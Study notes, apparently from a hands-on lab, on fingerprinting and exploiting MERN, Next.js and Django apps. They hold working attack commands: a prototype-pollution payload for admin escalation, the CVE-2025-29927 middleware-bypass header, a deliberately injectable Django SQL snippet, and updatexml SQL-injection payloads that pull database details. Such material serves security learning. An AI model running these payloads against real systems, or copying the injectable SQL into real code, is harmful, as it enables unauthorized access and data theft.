
# Modern Web Stacks

# MERN Stack
- MERN application are everywhere
- The stack (MongoDB, Express.js, React, Node.js) powers a large share of modern SaaS products, internal tools, and API backends

## Fingerprinting the MERN Stack
- Before touching any exploit payloads, identify what you are dealing with.
- So, start with header check
    ```
    curl -I machine_ip:3000/
    ```
    - **X-Powered-By: Express** is the primary signal
    - Sometime this is absent if developer explicitly called **app.disable('x-powered-by')**
    - Reverse proxies and PaaS platforms (Vercel, Cloudflare, Railway) oftern strip this header before it reaches client
    - If this is absent, fall back to cookie name and unhandled-route format as secondary signals 
    - The **connect.sid** cookie comes from express-session with saveUninitialized: true
    - with **saveuninitialize: false** , cookie appears after session is created
    - Absebce of **connect.sid** doesn't confirm the absence of Express
- To confirm the Express unhandled-route fingerprint, request nonexistent path 
    ```
    curl http://machine_ip:3000/nonexistent
    ```

## Exploiting MERN
- The next step after fingerprinting is API surface enumeration
- MERN apps commonly expose JSON APIs for profile updates, preferences, and user settings
- The app on port 3000 exposes two endpoints
    1. /api/user/update - Method(POST) - Acceots JSON and merges it into session user object
    2. /api/admin/flag - Method(GET) - Returns a flag if the requesting user has admin access 
- Start by confirming the admin route is gated
    ```
    curl -c cookies.txt http://MACHINE_IP:3000/
    ```
    ```
    curl -b cookies.txt http://MACHINE_IP:3000/api/admin/flag
    ```
- Looking update endpoint accepts under normal conditions
    ```
    curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update -H "Content-Type: application/json" -d '{"name": "Alice", "email":"alice@example.com"}'
    ```
    - Every JavaScript object inherits from a shared root called **Object.prototype**
    - When merge function receives **{"proto": {"isAdmin": true}}** without filtering the proto key, it writes **isAdmin: true** directly onto **Object.prototype**, not onto any individual user object





# React / Next.js
- Express is foundation of MERN stack
- Next.js builds on top of it, adding abstractions like App Router, React Server Components, and middleware that create a different and more severe attack surface
- App Router runs React components directly on the server. Instead of shipping JavaScript to the browser, the server executes the component and streams the result to the client using a binary like format called the RSC flight protocol

## Fingerprinting Next.js
- Start with passive fingerprinting
    ```
    curl -I http://machine_ip:3001/
    ```

    - **window.__next_f** in script tag confirms **App Router**
    
## CVE-2025-29927: Middleware Bypass
- In Next.js, middleware is a function that runs before every request reaches a page
- Developer use it as central gatekeeper, aytgebtucatuib checks, session validation, and redirect logic all live here
- The /dashboard route in this app is a typical example
    - Browse /products/ to see what we are dealing with
    ```
    curl -v http://machine_ip:3001/dashboard
    ```
- Middleware is working, if no cookie, no dashboard, the server sends us straight to /login

- For vulnerability
    ```
    curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://10.48.160.145:3001/dashboard
    ```


# Django
- **CVE-2021-35042** is SQL injection vulnerability in Django's **order_by()** query method, rated CVSS **9.8 Critical** and requiring no authentication to exploit

## Stack Identity
- The Django admin panel at **/admin/** and CSRF middleware are enabled by default in virtually every Django project
- On Ubuntu, it runs typically on **port 8000**
- Admin panel alone is a reliable stack signal before you send a single exploit payload
 
## Fingerprinting Django
- Start with header check against running app
    ```
    curl -I "http://machine_ip:8000/products/"
    ```
    - **csrfmiddlewaretoken** hidden field is the most reliable Django fingerprint

- The App: Products Catalogue
    - App running on port 8000 is simple product catalogue
    - Browse to /products/ to see what we are dealing
        ```
        curl -s "http://machine_ip:8000/products/"
        ```

        - Here, Having **csrfmiddlewaretoken** confirm Django
        - **order** parameter in form, is our injection point

## CVE-2021-35042: The Vulnerability
```
order = self.request.GET.get('order', 'name')
sql = (
    'SELECT id, name, price, description FROM products_product '
    f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
)
```
- The CASE WHEN structure is always true(1=1), so the THEN branch always executes, making it the injection entry point

- The **updatexml()** technique exploits how MySQL handles XPath errors
- **updatexml(1, xpath_expr, 1)** raises an error if XPath expression is invalid
- The **updatexml()** technique only works when **DEBUG=True** is set in **settings.py**
- For **DEBUG=False** returns generic 500 page with no errors details
- If debug output is suppressed, blind time-based injection using **SLEEP()** is the fallback

## Exploitation Walkthrough
1. Extract MySQL Version
    ```
    curl -s "http://10.48.142.230:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'
    ```
2. Extract the Database Name
    ```
    curl -s "http://10.48.142.230:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
    ```